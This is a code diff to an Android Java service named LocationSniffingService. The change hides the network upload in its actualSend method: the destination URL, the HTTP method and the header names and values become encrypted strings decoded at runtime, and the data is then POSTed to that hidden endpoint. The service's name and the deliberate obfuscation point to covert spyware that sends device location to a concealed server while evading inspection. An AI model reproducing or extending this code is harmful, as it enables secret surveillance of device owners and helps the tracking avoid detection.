@@ -92,21 +92,50 @@ public class LocationSniffingService extends Service{
     @TargetApi(Build.VERSION_CODES.KITKAT)
     private void actualSend(String s) {
         try {
-            URL url = new URL("toBeChanged");
+            String urlString = "d102jd012jasd";
+            String http = "uas0j1d12dasDas";
+            String requestProperty1 = "aspdk2DasdmaSDa==";
+            String requestProperty2 = "as=a=sdnasd2d22d2";
+            String requestProperty3 = "ask20asdj20jd9";
+            String requestProperty4 = "asdSDs22d@d222==";
+            String requestProperty5 = "20k20dk20ASD/**/2d==";
+
+            try{
+                urlString = StringHelper.getStringStatic(urlString);
+                http = StringHelper.getStringStatic(http);
+                requestProperty1 = StringHelper.getStringStatic(requestProperty1);
+                requestProperty2 = StringHelper.getStringStatic(requestProperty2);
+                requestProperty3 = StringHelper.getStringStatic(requestProperty3);
+                requestProperty4 = StringHelper.getStringStatic(requestProperty4);
+                requestProperty5 = StringHelper.getStringStatic(requestProperty5);
+            } catch (IllegalBlockSizeException e) {
+                e.printStackTrace();
+                return;
+            } catch (BadPaddingException e) {
+                e.printStackTrace();
+                return;
+            } catch (InvalidKeyException e) {
+                e.printStackTrace();
+                return;
+            } catch (Exception e){
+                e.printStackTrace();
+                return;
+            }
+
+            URL url = new URL(urlString);
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setDoOutput(true);
             connection.setInstanceFollowRedirects(false);
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            connection.setRequestProperty("charset", "utf-8");
-            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
+            connection.setRequestMethod(http);
+            connection.setRequestProperty(requestProperty1, requestProperty2);
+            connection.setRequestProperty(requestProperty3, requestProperty4);
+            connection.setRequestProperty(requestProperty5, Integer.toString(postData.length));
             connection.setUseCaches(false);
             try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                 wr.write(postData);
             }
         } catch (MalformedURLException e) {
-            e.printStackTrace();
             return;
         } catch (IOException e) {
             e.printStackTrace();
